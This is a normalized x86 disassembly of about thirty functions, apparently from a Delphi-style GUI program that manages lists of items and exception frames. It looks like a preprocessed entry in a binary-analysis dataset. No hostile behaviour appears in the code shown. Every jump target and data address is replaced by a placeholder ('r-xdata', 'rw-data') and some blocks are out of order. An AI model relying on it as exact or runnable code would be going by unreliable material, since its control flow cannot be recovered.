cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_4520dc
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4521ec
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_4521ec
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_452580
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_452204
mov edx eax
mov ecx esi
mov eax ebx
call sub_452390
pop esi
pop ebx
retn
sub_45259c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_452568
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_452444
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44f840
sub_4525c4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_452608
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_452608
jmp r-xdata
mov eax ebx
call sub_450668
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_4542e0
sub_452660
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebx + 0x4c ] eax
sub_452688
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_40324c
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45291c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403448
mov edx ebx
mov eax edi
call sub_41fca8
mov eax ebx
mov si 0xffee
call sub_403448
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_4526f8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ esi + 0x4c ] eax
sub_45272c
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_452204
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_452214
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45276c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45259c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_452580
jmp r-xdata
mov edx ebx
mov eax esi
call sub_452580
sub_4527d0
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_452094
sub_4527fc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45206c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_4520dc
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_452130
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403ff0
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45225c
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_4521a8
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_452238
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45224c
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45291c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4521ec
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403448
sub_452940
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452960
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452980
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4529a0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4529c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4529e0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452a00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452a20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452a40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452a60
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a8c0
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44cd68
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44cea0
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44cf00
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44cc00
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44cfc0
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_452ad8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41fef4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4521ec
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_452688
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_452b2c
jmp r-xdata
xor edx edx
mov eax esi
call sub_4505f0
sub_452b2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44dfc4
mov eax ebx
call sub_452b9c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44e008
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41fca8
sub_452b74
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_452b74
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44fcc4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_452608
mov eax ebx
pop esi
pop ebx
retn
sub_452bb0
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c5e4
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4044fc
sub_452be0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404034
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_452c64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_452d86
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_40425c
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_40425c
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4044bc
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452d8d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404544
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_40431c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_40425c
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4044bc
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_40431c
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_452dc4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_453263
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404034
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_453224
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_452204
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404034
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45326a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403fc0
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403fc0
lea eax [ ebp - 0x18 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax ebx
call sub_453418
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_452214
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043a8
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_452be0
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_452214
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_452214
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40324c
mov eax [ ebp - 0x20 ]
call sub_40324c
mov eax [ ebp - 0x14 ]
call sub_40324c
mov eax [ ebp - 0xc ]
call sub_40324c
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_452be0
pop ecx
mov eax [ ebp - 0x30 ]
call sub_40425c
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_452214
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_454d64
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407f64
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403ff0
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c5e4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c5e4
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_452214
push eax
mov edx esi
mov eax ebx
call sub_452214
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4044bc
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407f64
push ebp
mov eax [ ebp - 0x2c ]
call sub_452bb0
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_452bb0
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c5e4
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404034
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_452214
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_452214
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_454cd0
mov edx [ ebp - 0x40 ]
pop eax
call sub_403ff0
mov edx esi
mov eax ebx
call sub_452214
push eax
mov edx esi
mov eax ebx
call sub_452214
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40425c
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4044bc
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_452c64
mov eax [ ebp - 0x18 ]
call sub_40425c
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4044fc
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404544
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_452c64
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_4532c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_452204
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_452204
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_453444
test al al
je r-xdata
mov eax esi
call sub_452204
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_452214
call sub_45329c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_452214
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_452214
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_452214
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_452214
call sub_45329c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_452214
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_452214
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_452214
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_452214
call sub_45329c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_453418
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_453418
and eax 0x7f
mov al [ eax + rw-data ]
sub_453444
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_453444
and eax 0x7f
mov al [ eax + rw-data ]
sub_453470
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_450158
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41fbd8
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45419c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_45350c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_40324c
mov eax [ esi + 0x44 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_453580
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_453580
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44fcc4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_452608
mov eax ebx
pop esi
pop ebx
retn
sub_4535c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_452204
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
